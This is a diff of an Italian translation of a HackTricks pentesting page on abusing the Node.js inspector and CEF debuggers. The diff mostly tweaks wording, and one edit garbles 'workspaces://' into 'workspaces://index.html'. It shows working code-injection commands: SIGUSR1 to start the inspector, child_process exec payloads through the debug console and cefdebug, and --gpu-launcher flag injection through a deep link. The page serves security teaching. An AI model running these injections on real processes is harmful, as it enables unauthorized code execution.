@@ -1,4 +1,4 @@
-# Abuso del debug di Node inspector/CEF
+# Node inspector/CEF debug abuse
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -42,7 +42,7 @@ I siti web aperti in un browser possono effettuare richieste WebSocket e HTTP se
 
 ### Avviare l'inspector nei processi in esecuzione
 
-Puoi inviare il **segnale SIGUSR1** a un processo nodejs in esecuzione per farlo **avviare l'inspector** nella porta predefinita. Tuttavia, nota che devi avere privilegi sufficienti, quindi questo potrebbe concederti **accesso privilegiato alle informazioni all'interno del processo** ma non una diretta escalation di privilegi.
+Puoi inviare il **segnale SIGUSR1** a un processo nodejs in esecuzione per farlo **avviare l'inspector** nella porta predefinita. Tuttavia, nota che devi avere privilegi sufficienti, quindi questo potrebbe concederti **accesso privilegiato alle informazioni all'interno del processo** ma non una escalation di privilegi diretta.
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -52,7 +52,7 @@ kill -s SIGUSR1 <nodejs-ps>
 
 ### Connettersi all'inspector/debugger
 
-Per connettersi a un **browser basato su Chromium**, è possibile accedere agli URL `chrome://inspect` o `edge://inspect` per Chrome o Edge, rispettivamente. Cliccando sul pulsante Configura, si dovrebbe garantire che l'**host e la porta di destinazione** siano elencati correttamente. L'immagine mostra un esempio di Esecuzione Remota di Codice (RCE):
+Per connettersi a un **browser basato su Chromium**, è possibile accedere agli URL `chrome://inspect` o `edge://inspect` per Chrome o Edge, rispettivamente. Cliccando sul pulsante Configura, si dovrebbe assicurarsi che l'**host e la porta di destinazione** siano elencati correttamente. L'immagine mostra un esempio di Esecuzione Remota di Codice (RCE):
 
 ![](<../../images/image (674).png>)
 
@@ -63,7 +63,7 @@ node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-Lo strumento [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) consente di **trovare gli ispettori** in esecuzione localmente e **iniettare codice** in essi.
+Lo strumento [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) consente di **trovare gli inspector** in esecuzione localmente e **iniettare codice** in essi.
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -73,12 +73,12 @@ Lo strumento [**https://github.com/taviso/cefdebug**](https://github.com/taviso/
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 > [!NOTE]
-> Nota che gli **exploit RCE di NodeJS non funzioneranno** se connessi a un browser tramite [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (devi controllare l'API per trovare cose interessanti da fare con esso).
+> Nota che **gli exploit RCE di NodeJS non funzioneranno** se connessi a un browser tramite [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (devi controllare l'API per trovare cose interessanti da fare con esso).
 
 ## RCE nel Debugger/Inspector di NodeJS
 
 > [!NOTE]
-> Se sei arrivato qui cercando come ottenere [**RCE da un XSS in Electron, controlla questa pagina.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
+> Se sei arrivato qui cercando come ottenere [**RCE da un XSS in Electron, controlla questa pagina.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)
 
 Alcuni modi comuni per ottenere **RCE** quando puoi **connetterti** a un **inspector** di Node è utilizzare qualcosa come (sembra che questo **non funzionerà in una connessione al protocollo Chrome DevTools**):
 ```javascript
@@ -94,7 +94,7 @@ In questa sezione elencherò solo cose interessanti che ho trovato che le person
 
 ### Parameter Injection via Deep Links
 
-Nel [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security ha scoperto che un'applicazione basata su CEF **ha registrato un URI personalizzato** nel sistema (workspaces://) che riceveva l'URI completo e poi **lanciava l'applicazione basata su CEF** con una configurazione che era parzialmente costruita da quell'URI.
+Nel [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security ha scoperto che un'applicazione basata su CEF **ha registrato un URI personalizzato** nel sistema (workspaces://index.html) che riceveva l'URI completo e poi **lanciava l'applicazione basata su CEF** con una configurazione che era parzialmente costruita da quell'URI.
 
 È stato scoperto che i parametri URI venivano decodificati in URL e utilizzati per lanciare l'applicazione di base CEF, consentendo a un utente di **iniettare** il flag **`--gpu-launcher`** nella **linea di comando** ed eseguire cose arbitrarie.
 
